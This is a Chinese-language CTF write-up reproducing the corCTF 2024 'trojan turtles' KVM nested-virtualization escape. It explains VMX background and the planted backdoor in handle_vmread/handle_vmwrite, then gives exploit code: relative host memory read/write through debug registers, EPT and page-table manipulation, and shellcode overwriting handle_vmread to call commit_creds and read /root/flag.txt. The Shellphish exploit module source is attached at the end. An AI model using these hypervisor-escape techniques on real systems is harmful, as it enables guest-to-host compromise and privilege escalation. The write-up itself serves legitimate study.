参考
==

<https://zolutal.github.io/corctf-trojan-turtles/>  
<https://eqqie.cn/index.php/archives/1972>

前言
==

一直对虚拟化技术比较感兴趣，前段时间尝试了qemu逃逸和vmware逃逸的例题，这次2024corctf发现一道KVM嵌套虚拟化逃逸的题目，来了兴趣，但个人接触CTF时间还不到1年，思路方面还是受阻了很多，当时就把相关KVM和VMX源码大致逻辑看了看，赛后找shellphish团队要了一份wp来学习，在此写下复现记录

KVM（Kernel-based Virtual Machine）
=================================

### KVM 的概念

KVM 是一种基于 Linux 内核的虚拟化技术，它允许 Linux 内核充当虚拟机监控器 (VMM) 或 hypervisor。KVM 的主要目的是提供一个统一的接口，使用户空间程序能够利用硬件虚拟化特性（如 Intel 的 VMX 和 AMD 的 SVM）来创建和管理虚拟机。

### KVM 的实现

KVM 通过一个名为 `/dev/kvm` 的字符设备驱动程序实现。该驱动程序提供了一系列 ioctl (输入输出控制) 命令，用于管理和控制虚拟机 (VM) 的状态和行为。

#### ioctl 命令

ioctl 命令是一种通用的机制，用于在用户空间程序和内核空间之间传递控制信息。KVM 设备驱动程序提供了许多 ioctl 命令，这些命令用于配置虚拟机的状态、设置寄存器值、加载虚拟机的内存映射、控制虚拟机的执行等。

- **KVM\_SET\_REGS**: 
    - 该命令用于设置虚拟机的寄存器状态。
    - 用户空间程序可以使用此命令来将通用寄存器写入 vcpu的通用寄存器中。

#### KVM API 文档

- **API 文档**: 
    - 更多关于 KVM API 的详细信息可以在 Linux 内核文档中找到，具体链接为：<https://docs.kernel.org/virt/kvm/api.html>
    - 这些文档详细介绍了可用的 ioctl 命令、参数结构和如何使用它们来控制虚拟机。

### KVM 的编译选项

KVM 可以以不同的形式集成到 Linux 内核中，具体取决于编译时的选择：

- **编译到内核中**:
    
    
    - 如果在内核配置中将 `CONFIG_KVM_INTEL` 设置为 `y`，则 KVM 将被编译到内核映像中。
    - 这意味着 KVM 成为内核的一部分，无需加载额外的模块即可使用。
- **编译为内核模块**:
    
    
    - 如果 `CONFIG_KVM_INTEL` 设置为 `m`，那么 KVM 将被编译为一个可加载的内核模块。
    - 这意味着 KVM 功能可以通过动态加载模块的方式启用或禁用，提供了更大的灵活性。

### QEMU 与 KVM 的结合

QEMU 是一个通用的全系统仿真器，它可以模拟多种硬件架构。当与 KVM 结合使用时，QEMU 可以利用 KVM 提供的硬件加速功能来提高虚拟机的性能。

- **使用 KVM**:
    
    
    - 当您使用 `--enable-kvm` 参数启动 QEMU 时，QEMU 将使用 KVM API 来运行虚拟机。
    - 这意味着 QEMU 将利用硬件虚拟化特性，而不是完全通过软件进行模拟。
    - 结果是提高了虚拟机的性能，减少了 CPU 开销。
- **不使用 KVM**:
    
    
    - 如果没有使用 `--enable-kvm` 参数，QEMU 将通过纯软件模拟的方式来运行虚拟机。
    - 这种模式下的性能通常较低，因为它需要 QEMU 在用户空间中模拟所有的硬件细节。

### 工作原理

1. **初始化**：当 KVM 被启动时，它会检查硬件是否支持虚拟化，并初始化必要的数据结构。
2. **创建虚拟机**：用户空间的应用程序通过系统调用告知内核创建一个新的虚拟机实例。
3. **配置虚拟机**：应用程序通过一系列系统调用来配置虚拟机的硬件（如内存大小、CPU 数量等）和加载操作系统镜像。
4. **运行虚拟机**：一旦配置完成，应用程序可以启动虚拟机。此时，KVM 会接管虚拟机的操作并确保它们正确地执行。
5. **特权指令处理**：当虚拟机尝试执行特权指令时，这些指令会被捕获并传递给 KVM，由 KVM 在宿主机上模拟执行或直接在硬件上执行（如果支持的话）。

嵌套虚拟化（虚拟机里再建一个虚拟机）
==================

当我们说"处理器现在可以执行VMX(虚拟化)相关的指令了"，这意味着CPU获得了执行一系列特殊指令的能力，这些指令专门用于虚拟化操作。

1. VMX指令集：
    
    
    - Intel处理器有一组特殊的指令，专门用于虚拟化，称为VMX（Virtual Machine Extensions）指令。
    - 这些指令包括VMXON, VMXOFF, VMLAUNCH, VMRESUME, VMREAD, VMWRITE等。
2. 指令的作用：
    
    
    - 这些指令允许操作系统或虚拟机管理器（如VMware, VirtualBox）创建和管理虚拟机。
    - 它们提供了硬件级别的支持，使虚拟化更高效、更安全。
3. 启用前后的区别：
    
    
    - 启用VMXE位之前：如果尝试执行这些VMX指令，处理器会产生一个异常（通常是非法指令异常）。
    - 启用VMXE位之后：处理器能够正确识别和执行这些指令。
4. 实际应用例子：  
    假设你要在电脑上运行一个虚拟机：
    
    
    - 启用VMXE之前：虚拟机软件只能通过纯软件模拟来运行虚拟机，效率较低。
    - 启用VMXE之后：虚拟机软件可以利用这些硬件指令，大大提高虚拟机的运行效率。

嵌套虚拟化的系统中虚拟机执行vmx指令（对虚拟机中的虚拟机的相关操作）
===================================

[vmx指令相关使用](https://wiki.osdev.org/VMX#VMCS)

1. 初始状态：
    
    
    - L0: 主机VMM (Hypervisor)
    - L1: 第一层虚拟机，运行自己的VMM
    - L2: 第二层虚拟机（可选）
2. L1执行VMX指令：
    
    a. 指令拦截：
    
    
    - L1尝试执行VMX指令
    - 硬件检测到这是一个需要特殊处理的指令
    
    b. VM Exit到L0：
    
    
    - 控制权从L1转移到L0 VMM
    - L0 VMM获得关于VM Exit原因的信息
    
    c. L0 VMM分析：
    
    
    - 确定是VMX指令导致的退出
    - 检查L1的权限和当前状态
    
    d. 模拟执行：
    
    
    - L0 VMM不会直接执行该指令
    - 相反，它模拟指令的效果
    
    e. 虚拟VMCS操作：
    
    
    - 如果指令涉及VMCS操作，L0会操作分配给L1的虚拟VMCS
    - 虚拟VMCS是实际VMCS的一个"影子"或模拟
    
    f. 状态更新：
    
    
    - L0更新L1的虚拟状态，使其看起来好像指令已经执行
    
    g. VM Entry回到L1：
    
    
    - L0完成模拟后，将控制权返回给L1
    - L1继续执行，就像它直接执行了VMX指令一样
3. 特殊情况 - L1创建L2：
    
    a. L1执行VMLAUNCH/VMRESUME：
    
    
    - 用于启动或恢复L2虚拟机
    
    b. L0拦截并模拟：
    
    
    - L0创建或配置用于L2的新虚拟VMCS
    - 设置必要的嵌套虚拟化结构
    
    c. 实际VM Entry：
    
    
    - L0执行真正的VM Entry进入L2
    - L2开始执行，认为它是由L1直接管理的
4. L2执行需要VM Exit的操作：
    
    a. 硬件VM Exit到L0：
    
    
    - 控制权直接转到L0，不经过L1
    
    b. L0决策：
    
    
    - 决定是否需要通知L1
    - 如果需要，模拟一个从L2到L1的VM Exit
    - 否则，L0自己处理并返回到L2
5. 优化和硬件支持：
    
    
    - 现代处理器提供如VMCS Shadowing等功能
    - 这些功能可以减少VM Exit的次数，提高性能
6. 循环继续：
    
    
    - 这个过程不断重复，处理L1和L2的各种操作

镜像文件qcow2/上传exp/调试
==================

- 安装了 QEMU 的工具 ```bash
    
    # 对于 Debian/Ubuntu:
    sudo apt-get install qemu-utils
    ```

```php

接下来，检查 `.qcow2` 文件的信息：

```bash
qemu-img info chall.qcow2
```

- 挂载查看文件并修改

```bash
sudo guestmount -a chall.qcow2 -m /dev/sda /mnt/qcow2
cd /mnt/qcow2
```

```php
root@ubuntu:/mnt/qcow2# ls
bin  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vm
```

```bash
tree -L 2
```

发现有这个玩意，应该就是虚拟机对应的镜像了和文件系统和启动脚本了，将其虚拟机的文件系统解压查看然后添加exp模块进去再打包再起虚拟机就行了

```php
└── vm
    ├── bzImage
    ├── initramfs.cpio
    └── run-vm.sh
```

分别安装相关内核库,这里是要生成对应的虚拟机中的内核模块，然后加载模块进而逃逸到主机

```bash
sudo dpkg -i linux-hwe-5.15-headers-5.15.0-107_5.15.0-107.117~20.04.1_all.deb
sudo dpkg -i linux-headers-5.15.0-107-generic_5.15.0-107.117~20.04.1_amd64.deb
ls /usr/lib/modules/5.15.0-107-generic/build
```

exp.c下的Makefile，/usr/lib/modules/5.15.0-107-generic/build目录下一般也有，没就建一个就好了

```bash

obj-m += exp.o
KDIR := /usr/lib/modules/5.15.0-107-generic/build
PWD := $(shell pwd)

all:
    make -C $(KDIR) M=$(PWD) modules

clean:
    make -C $(KDIR) M=$(PWD) clean
```

然后make就可以生成了

漏洞
==

虚拟机进行相关vmx指令或者说嵌套虚拟化时由于相关vmx指令会被检测到是特殊指令会触发VMexit，然后宿主机VMM来处理该特殊指令

diff
----

diff点在于handle\_vmread和handle\_vmwrite函数

```c
__int64 __fastcall handle_vmwrite(__int64 a1, int a2, int a3, int a4, int a5, int a6){
{
………
………
 if ( kvm_get_dr(a1, 0LL) == 0x1337BABE )
  {
    dr = kvm_get_dr(a1, 1LL);
    *(_QWORD *)(v7 + 8 * dr) = kvm_get_dr(a1, 2LL);
  }
………
}
__int64 __fastcall handle_vmread(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
    …………
  if ( kvm_get_dr(a1, 0LL) == 0x1337BABE )
  {
    dr = kvm_get_dr(a1, 1LL);
    kvm_set_dr(a1, 2LL, *(_QWORD *)(v6 + 8 * dr));
  }
  …………………
}

```

```c
static inline struct vmcs12 *get_shadow_vmcs12(struct kvm_vcpu *vcpu)
{
    return to_vmx(vcpu)->nested.cached_shadow_vmcs12;
}

static __always_inline struct vcpu_vmx *to_vmx(struct kvm_vcpu *vcpu)
{
    return container_of(vcpu, struct vcpu_vmx, vcpu);
}

#define container_of(ptr, type, member) ({              \
    void *__mptr = (void *)(ptr);                   \
    static_assert(__same_type(*(ptr), ((type *)0)->member) ||   \
              __same_type(*(ptr), void),            \
              "pointer type mismatch in container_of()");   \
    ((type *)(__mptr - offsetof(type, member))); })

```

漏洞点
---

- handle\_vmwrite会从第struct kvm\_vcpu的arch.db\[0\]对应的内容，如果是0x1337BABE，然后会取第struct kvm\_vcpu的arch.db\[1\]对应的内容为dr，然后会取第struct kvm\_vcpu的arch.db\[2\]对应的内容赋值给 struct vmcs12 *+8*dr对应的地址所在内容
    
    `*（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）=struct kvm_vcpu的arch.db[2]`
- handle\_vmread会从第struct kvm\_vcpu的arch.db\[0\]对应的内容，如果是0x1337BABE，然后会取第struct kvm\_vcpu的arch.db\[1\]对应的内容为dr，然后会将 struct vmcs12 *+8*dr对应的地址的内容赋值给struct kvm\_vcpu的arch.db\[2\]
    
    `struct kvm_vcpu的arch.db[2]= *（struct vmcs12 *+8*struct kvm_vcpu的arch.db[0]）`

可以相对struct vmcs12 \*的任意地址读写，而且这个 vmcs12指向的是我们在虚拟机分配的vmcs在主机上的地址，为什么呢？因为这个地方是处理虚拟机执行vmx指令的，而vmread指令是从控制的虚拟机的vmcs里读取相关字段，而虚拟机执行vmread会陷入到主机的vmm中去，然后再去处理虚拟机的vmread，所以这里的vmcs自然也是虚拟机控制的虚拟机的VMCS了

这就相当于主机的任意地址读写了（但这里的struct kvm\_vcpu \*vcpu还是虚拟机的，不是虚拟机里的虚拟机的）

思路
==

vmx相关初始化
--------

[vmx指令相关使用](https://wiki.osdev.org/VMX#VMCS)

为了能够执行 vmread/vmwrite 指令，需要进行一些设置。vmread 和 vmwrite 指令用于与“虚拟机控制结构”(VMCS) 交互，在虚拟机机中执行就是和嵌套虚拟机的VMCS交互，所以首先虚拟机要开启VMX模式（嵌套虚拟机化），这样才能嵌套虚拟化，所以没有嵌套虚拟机的VMCS，自然vmread指令和vmwrite无法使用

首先是分配并初始化VMXON Region和嵌套虚拟机实例对应的VMCS Region

```c
    vmxon_page = kmalloc(4096, GFP_KERNEL);
    memset(vmxon_page, 0, 4096);
    vmcs_page = kmalloc(4096, GFP_KERNEL);   
    memset(vmcs_page, 0, 4096);
    vmxon_page_pa = virt_to_phys(vmxon_page);
    vmcs_page_pa = virt_to_phys(vmcs_page);
    printk("vmxon_page %p --- vmxon_page_pa %p",vmxon_page,vmxon_page_pa);
    printk("vmcs_page %p --- vmcs_page_pa %p",vmcs_page,vmcs_page_pa);
```

然后是设置vmxon\_page 和vmcs\_page的开头信息，读MSR寄存器的指令是rdmsr，这条指令使用eax，edx，ecx作为参数，ecx用于保存MSR寄存器相关值的索引，而edx，eax分别保存结果的高32位和低32位。该指令必须在ring0权限或者实地址模式下执行；否则会触发#GP(0)异常。在ecx中指定一个保留的或者未实现的MSR地址也会引发异常。这里根据索引读到vmcs\_revision的值，然后保存到vmxon\_page和vmcs\_page的开头

```c
    uint32_t a, d;
    asm volatile ("rdmsr" : "=a"(a), "=d"(d) : "c"(MSR_IA32_VMX_BASIC) : "memory");
    uint64_t vmcs_revision=a | ((uint64_t) d << 32);
    printk("vmcs_revision %p",vmcs_revision);
    *(uint64_t *)(vmxon_page) = vmcs_revision;
    *(uint64_t *)(vmcs_page) = vmcs_revision;
```

然后是启动vmx模式，通过从虚拟机的 CR4中取出第13位放入rax中并将该位设为1，再更新回cr4，这一步的目的是打开CR4寄存器中的虚拟化开关

```c
    asm volatile (
    "movq %cr4, %rax\n\t"
    "bts $13, %rax\n\t"
    "movq %rax, %cr4"
);
```

> 注意： VMXON、VMCLEAR 和 VMPTRLD 指令必须指向各自区域的物理地址。

vmxon指令通过传入分配的VMXON Region的物理地址作为操作数，表示进入VMX操作模式，setna指令借助EFLAGS.CF的值判断执行是否成功：

- setna 表示 "set if not above"，它会根据 vmxon 指令的结果设置一个字节。如果vmxon指令成功将返回0
    
    ```c
    
    
    asm volatile (
    "vmxon %[pa]\n\t"
    "setna %[ret]"
    : [ret] "=rm" (vmxonret)
    : [pa] "m" (vmxon_page_pa)
    : "cc", "memory"
    );
    printk("vmxonret %p",vmxonret);
    ```

```php

这里可以留意一下，VMX的虚拟化开启需要打开两个“开关”，一个是Host CR4寄存器的第13位，一个是vmxon指令

> 顺便补充一点关于GCC内联汇编的概念：在clobbered list（第三行冒号）中加入cc和memory会告诉编译器内联汇编会修改cc（状态寄存器标志位）和memory（内存）中的值，于是编译器不会再假设这段内联汇编后对应的值依然是合法的

vmptrld 加载一个VMCS结构体指针作为当前操作对象:

```c

   asm volatile (
    "vmptrld %[pa]\n\t"
    "setna %[ret]"
    : [ret] "=rm" (vmptrldret)
    : [pa] "m" (vmcs_page_pa)
    : "cc", "memory"
);
```

VMCS被加载到逻辑CPU上后，处理器并没法通过普通的内存访问指令去访问它， 如果那样做的话，会引起“处理器报错”，唯一可用的方法就是通过vmread和vmwrite指令去访问。

相对地址任意读写
--------

任意读通过设置db0和db1，然后读出的内容在db2

```c
static size_t read_relative(size_t offset_to_nest_vmcs)
{
    size_t value;
    size_t vmcs_field_value=0;
    size_t vmcs_field=0;
    size_t magic=0x1337BABE;
    asm("movq %0, %%db0"    ::"r" (magic));
    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
    asm volatile (
    "vmread %1, %0\n\t"  
    : "=r" (vmcs_field_value)
    : "r" (vmcs_field)
);
    asm("movq %%db2, %0" :"=r" (value));
    return value;

}
```

任意写通过设置db0和db1和db2，将db2写到目的位置

```c
static void write_relative(size_t offset_to_nest_vmcs,size_t value)
{
    size_t vmcs_field_value=0;
    size_t vmcs_field=0;
    size_t magic=0x1337BABE;
    asm("movq %0, %%db0"    ::"r" (magic));
    asm("movq %0, %%db1"    ::"r" (offset_to_nest_vmcs));
    asm("movq %0, %%db2"    ::"r" (value));
    asm volatile (
    "vmwrite %1, %0\n\t"  
    : "=r" (vmcs_field_value)
    : "r" (vmcs_field)
);
    asm("movq %%db2, %0" :"=r" (value));

}
```

寻找虚拟机的VMCS的偏移
-------------

由于我们是相对嵌套虚拟机的VMCS在宿主机上的虚拟地址的相对任意地址读和写，而VMCS都是kmalloc分配的，然后内核堆在直接映射区上，所以通过上下相对地址扫描去根据VMCS相关特征去找虚拟机的VMCS在宿主机上的虚拟地址

根据vmcs结构体的特征，我们选择其字段guest\_idtr\_base 。这个值不会变化，并且VMCS 需要页面对齐，因此只需要在页面粒度的偏移 0x208 处查找 IDT 基地址0xfffffe0000000000（guest\_idtr\_base ）就可以找到虚拟机的VMCS的虚拟地址

我们可以看看偏移为0时候vmcs的内容，就是vmcs\_revision的字段内容

```c
 for (i = 0; i < 0x4000; i++) {
        pos_offset = ((i * 0x1000) + 0x208) / 8;
        neg_offset = ((i * -1 * 0x1000) + 0x208) / 8;

        pos_val = read_relative(pos_offset);
        if (pos_val == 0xfffffe0000000000) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

        neg_val = read_relative(neg_offset);
        if (neg_val == 0xfffffe0000000000) {
            found_val = neg_val;
            found_offset = neg_offset;
            break;
        }
    }
    pr_info("vmcs12[%llx * 8] = %llx\n", pos_offset, pos_val);
    pr_info("vmcs12[%llx * 8] = %llx\n", neg_offset, neg_val);
```

寻找nest\_vmx进而泄露嵌套虚拟机的在宿主机上的虚拟地址
-------------------------------

nested\_vmx结构包含一个指向嵌套虚拟机VMCS的指针： cached\_vmcs12 。它还包含一些我们知道其值的字段： vmxon\_ptr和current\_vmptr ，它们是我们创建的 VMXON 区域和 VMCS 的在虚拟机上的物理地址。所以我们可以扫描内存找到对应偏移位置为 VMXON 区域和 VMCS 的在虚拟机上的物理地址（这个我们是知道的），然后就可以知道nested\_vmx 的偏移，进而知道cached\_vmcs12的偏移，然后根据偏移读出嵌套虚拟机VMCS的虚拟地址，

```c
struct nested_vmx {
    /* Has the level1 guest done vmxon? */
    bool vmxon;
    gpa_t vmxon_ptr;
    bool pml_full;

    /* The guest-physical address of the current VMCS L1 keeps for L2 */
    gpa_t current_vmptr;
    /*
     * Cache of the guest's VMCS, existing outside of guest memory.
     * Loaded from guest memory during VMPTRLD. Flushed to guest
     * memory during VMCLEAR and VMPTRLD.
     */
    struct vmcs12 *cached_vmcs12;
    ...
}
```

```c
 for (i = 1; i < (0x4000*0x200); i += 2) {
        pos_offset = i;
        neg_offset = -i;

        if ( read_relative(pos_offset)== vmcs_page_pa && read_relative(pos_offset-2) == vmxon_page_pa) {
            found_val = pos_val;
            found_offset = pos_offset;
            break;
        }

    }
l2_vmcs_addr = read_guy(nested_vmx_offset+1);

```

得到phymap基地址
-----------

> 非常感谢nightu和Eurus和flyyy和tplus各位师傅的帮助

```c
 /**
     * KASLR's granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
     * For MEM > 1GB, we can just find the secondary_startup_64 func ptr,
     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
     */
    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
    for (;;) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);

        if (buf[0] > 0xffffffff81000000 && ((buf[0] & 0xfff) == 0x070)) {
            kernel_base = buf[0] -  0x070;
            kernel_offset = kernel_base - 0xffffffff81000000;
            printf("\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n"
                   "\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n", 
                   kernel_base, kernel_offset);
            break;
        }

        vmemmap_base -= 0x10000000;
    }
    printf("\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n", vmemmap_base);
```

通过嵌套虚拟机VMCS的虚拟地址得到主机的physmap 基址，这里可以先试试掩码（偏移只能是256MB的倍数），但如果此时object地址偏移超过0x10000000的话就需要采用上述遍历的方法，这里侥幸掩码就能成功

```c
   physbase = l2_vmcs_addr & ~0xfffffffull;
```

获得ept
-----

然后通过虚拟机的VMCS的偏移量（之前得到位置偏移量了）进而得到其中EPTP（以主机的物理地址形式存在）

```c
 eptp_value = read_relative(l1_vmcs_offset-50);
```

EPTP是第四级页表的在主机上的物理地址，然后和physbase得到虚拟地址，再和之前的嵌套虚拟机的VMCS的在主机的虚拟地址（也就是一开始的相对任意地址读写的起始那玩意，但后来被泄露出了在主机上的虚拟地址）相减得到偏移，再通过偏移得到EPT表的第一个表项。

```c
eptp_value = read_relative(l1_vmcs_offset-50);
ept_addr = physbase + (eptp_value & ~0xfffull);
ept_offset = (ept_addr-l2_vmcs_addr) / 8;
third_value = read_relative(ept_offset);
```

改虚拟机的的EPT
---------

<https://www.owalle.com/2018/12/10/kvm-memory/>

> EPT表和相关页表项都是主机的物理地址

读出第四级页表的第一个entry后，即第三级页表在主机的物理地址，然后依然是得到在主机上的虚拟地址，然后得到偏移往第三级页表写一个页表项，此时大项可以代表一个1GB，2的九次方*2的九次方*2的十二次方=1GB

```c
third_addr = physbase + (third_value & ~0xfffull);
    pr_info("[exp]: pml4e_addr: %llx\n", pml4e_addr);

    third_offset = (third_addr-l2_vmcs_addr) / 8;
    pr_info("[exp]: pml4e_offset: %llx\n", pml4e_offset);

    write_relative(third_offset + 6, 0x87);
```

此时0x87代表该页表项是个大页，此时 1GB Page Physical Addr是0

此时为了不打乱已有的页表项，这里添加一个，此时是第6个entry，所以对应6GB-7GB，最终虚拟机里的物理地址6GB-7GB映射到主机的物理地址是0GB-1GB

改虚拟机的cr3
--------

```php

+-------------------+
|     CR3 Register  |
+-------------------+
         |
         v
+-------------------+
|   Physical Memory |
|                   |
| +---------------+ |
| |     PGD       | |
| | [0]           | |
| | ...           | |
| | [272]         | |
| | ...           | |
| +---------------+ |
|                   |
+-------------------+

After:
+-------------------+
|     CR3 Register  |
+-------------------+
         |
         v
+-------------------+
|   Physical Memory |
|                   |
| +---------------+ |
| |     PGD       | |
| | [0]           | |
| | ...           | |
| | [272] --------+---> +---------------+
| | ...           | |   | New PGDE Page |
| +---------------+ |   | [0] -------+  |
|                   |   | ...        |  |
|                   |   +------------+  |
|                   |                |  
|                   |                v  
|                   |        +----------------+
|                   |        | 1GB Huge Page  |
|                   |        | at 0x180000000 |
|                   |        | (6GB physical) |
|                   |        +----------------+
+-------------------+
```

虚拟机的CR3存的是虚拟机的页表的物理地址（完成GVA-&gt;GPA的），修改里面的页表项目肯定不能直接通过物理地址修改，得通过虚拟机的直接映射区来修改，虚拟机的直接映射区起始地址就是page\_offset\_base这个变量可以知道，里面的页表项也要是虚拟机的物理地址形式

这里也是向第四级页表的第272个写入一个entry，然后第三级页表的第一个entry为`0x180000000 | (1<<7) | 0x3`使得虚拟机的虚拟地址0xffff880000000000+0GB-0xffff880000000000+1GB映射到虚拟机的物理地址6GB-7GB

因为第三级页表的第272个对应到高39位到高48位即100010000对应0x88和一个二进制位0，然后这里前面的位会和这里的最高位保持一致

```c
    cr3 = read_cr3();
    four= (cr3 & ~0xfffull) + page_offset_base;

    third_page= kzalloc(0x1000, GFP_KERNEL);
    third= virt_to_phys(third_page);

    four[272] = third| 0x7;

    third[0] =  0x180000000 | 0x87;
```

寻找覆盖函数
------

最终虚拟机中0xffff880000000000+0GB-0xffff880000000000+1GB是映射到主机物理内存0-1G，很显然1G远远大于主机内存了（qemu模拟设置的内存只有几百M），所以此时我们虚拟机中从0xffff880000000000开始遍历，相当于从物理地址0开始遍历，自然可以遍历到想要覆盖的函数,然后覆盖为shellcode

原函数

```php
.text:000000000001F4D0                                                 handle_vmread   proc near               ; DATA XREF: nested_vmx_hardware_setup+1C0↓o
.text:000000000001F4D0
.text:000000000001F4D0                                                 var_64          = byte ptr -64h
.text:000000000001F4D0                                                 var_60          = qword ptr -60h
.text:000000000001F4D0                                                 var_58          = qword ptr -58h
.text:000000000001F4D0                                                 var_50          = dword ptr -50h
.text:000000000001F4D0                                                 var_38          = qword ptr -38h
.text:000000000001F4D0
.text:000000000001F4D0 F3 0F 1E FA                                                     endbr64
.text:000000000001F4D4 41 57                                                           push    r15
.text:000000000001F4D6 41 56                                                           push    r14
.text:000000000001F4D8 41 55                                                           push    r13
.text:000000000001F4DA 41 54                                                           push    r12
.text:000000000001F4DC 55                                                              push    rbp
.text:000000000001F4DD 48 89 FD                                                        mov     rbp, rdi
.text:000000000001F4E0 53                                                              push    rbx
.text:000000000001F4E1 48 83 EC 38                                                     sub     rsp, 38h
.text:000000000001F4E5 4C 8B BF 78 1C 00 00                                            mov     r15, [rdi+1C78h]
.text:000000000001F4EC 65 48 8B 04 25 28 00 00 00                                      mov     rax, gs:28h
.text:000000000001F4F5 48 89 44 24 30                                                  mov     [rsp+68h+var_38], rax
```

这里选择和函数保持在一个页里的特殊字节码就行了

通过十六进制编辑器去找，这里我选择的是0x00001C70BF440F4C，因为这里除了60开始的位置就只有这里了，而我们查看的偏移是0x503

```php
.text:000000000001F503 4C 0F 44 BF 70 1C 00 00                                         cmovz   r15, [rdi+1C70h]
```

```c
 for (i = 0; i < (1<<18); i += 0x1000) {
        unsigned long long val = *((unsigned long long *)(0xffff880000000503 + i));

        // check the value and check if relocations were applied
        if (val == 0x1C70BF440F4C  ) {
            handle_vmread_page = 0xffff880000000000 + i;
            break;
        }
    }
    handle_vmread = handle_vmread_page + 0x4d0;
```

shellcode
---------

- CPU Entry Area Mapping:  
    这是内核内存中的一个特殊区域，用于存储一些重要的CPU相关数据结构和入口点。这个区域的地址通常是固定的，不受KASLR（内核地址空间布局随机化）的影响。  
    在这个区域的起始点有几个地址，它们与内核text段（代码段）保持固定的偏移关系。这意味着，如果你知道这些地址的值，你就可以计算出内核代码的实际加载地址。
    
    
    - 由于CPU Entry Area Mapping的地址是固定的，攻击者可以直接读取0xfffffe0000000004这个地址的内容。然后，通过一些简单的计算（可能是加上或减去一个固定的偏移量），得到基地址

```bash

/*
    push rax
    push rbx
    push rcx
    push rdx
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push rdi
    push rsi

    // get kaslr base
    mov rax, 0xfffffe0000000004
    mov rax, [rax]
    sub rax, 0x1008e00

    // r12 is kaslr_base
    mov r12, rax

    // commit_creds
    mov r13, r12
    add r13, 0xbdad0

    // init_cred
    mov r14, r12
    add r14, 0x1a52ca0

    mov rdi, r14
    call r13

    // filp_open
    mov r11, r12
    add r11, 0x292420

    // push /root/flag.txt
    mov rax, 0x7478742e6761
    push rax
    mov rax, 0x6c662f746f6f722f
    push rax
    mov rdi, rsp

    // O_RDONLY
    mov rsi, 0

    call r11

    // r10 is filp_ptr
    mov r10, rax

    // kernel_read
    mov r11, r12
    add r11, 0x294c70

    // writeable kernel address
    mov r9, r12
    add r9, 0x18ab000

    mov rdi, r10
    mov rsi, r9
    mov rdx, 0x100
    mov rcx, 0

    call r11

    pop rax
    pop rax

    pop rsi
    pop rdi
    pop r13
    pop r14
    pop r12
    pop r11
    pop r10
    pop r9
    pop rdx
    pop rcx
    pop rbx
    pop rax
*/
```

当然不能直接生猛的覆盖，不然可能出现故障无法返回到虚拟机，所以这里提前先将成功返回的必经的范围都覆盖为nop，保存寄存器同时最后还原寄存器，最后覆盖最后为ret（这里可以结合调试试试覆盖后哪些指令返回后能正常返回虚拟机）

这里覆盖000000000001F751之前的都为nop，然后000000000001F756为ret可成功返回虚拟机

```php
.text:000000000001F74E                                                 loc_1F74E:                              ; CODE XREF: handle_vmread+43D↓j
.text:000000000001F74E 48 89 EF                                                        mov     rdi, rbp
.text:000000000001F751 E8 DA 39 FF FF                                                  call    nested_vmx_succeed
.text:000000000001F756为ret可成功返回虚拟机 E9 F6 FD FF FF                                                  jmp     loc_1F551
```

```c
memset(handle_vmread, 0x90, 0x281);
    handle_vmread[0x286] = 0xc3;

    memcpy(handle_vmread, shellcode, sizeof(shellcode)-1);

    read_realative(0);

    // scan for flag in memory
    for (i = 0; i < 1<<18; i+= 0x1000) {
        if (!memcmp(0xffff880000000000 + i, "corctf{", 7)) {
            pr_info("flag: %s\n", 0xffff880000000000 + i);
            break;
        }
    }

```

exp
===

由于本人复现的exp有些过于丑陋，为了读者能够更好的参考到，这里还是附上我参考的Shellphish的wp

```c
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/efi.h>

#include <asm/uaccess.h>
#include <asm/fsgsbase.h>
#include <asm/io.h>
#include <linux/uaccess.h>

static ssize_t proc_read(struct file* filep, char* __user buffer, size_t len, loff_t* offset);
static ssize_t proc_write(struct file* filep, const char* __user u_buffer, size_t len, loff_t* offset);
static int proc_open(struct inode *inode, struct file *filep);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,5,0)

static struct proc_ops fops = {
    .proc_open = proc_open,
    .proc_read = proc_read,
    .proc_write = proc_write,
};

#else

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = proc_open,
    .read = proc_read,
    .write = proc_write,
};

#endif

const char kvm_dat[] = "\x0f\x78\xc6\x3e";

/*
    push rax
    push rbx
    push rcx
    push rdx
    push r9
    push r10
    push r11
    push r12
    push r13
    push r14
    push rdi
    push rsi

    // get kaslr base
    mov rax, 0xfffffe0000000004
    mov rax, [rax]
    sub rax, 0x1008e00

    // r12 is kaslr_base
    mov r12, rax

    // commit_creds
    mov r13, r12
    add r13, 0xbdad0

    // init_cred
    mov r14, r12
    add r14, 0x1a52ca0

    mov rdi, r14
    call r13

    // filp_open
    mov r11, r12
    add r11, 0x292420

    // push /root/flag.txt
    mov rax, 0x7478742e6761
    push rax
    mov rax, 0x6c662f746f6f722f
    push rax
    mov rdi, rsp

    // O_RDONLY
    mov rsi, 0

    call r11

    // r10 is filp_ptr
    mov r10, rax

    // kernel_read
    mov r11, r12
    add r11, 0x294c70

    // writeable kernel address
    mov r9, r12
    add r9, 0x18ab000

    mov rdi, r10
    mov rsi, r9
    mov rdx, 0x100
    mov rcx, 0

    call r11

    pop rax
    pop rax

    pop rsi
    pop rdi
    pop r13
    pop r14
    pop r12
    pop r11
    pop r10
    pop r9
    pop rdx
    pop rcx
    pop rbx
    pop rax
*/

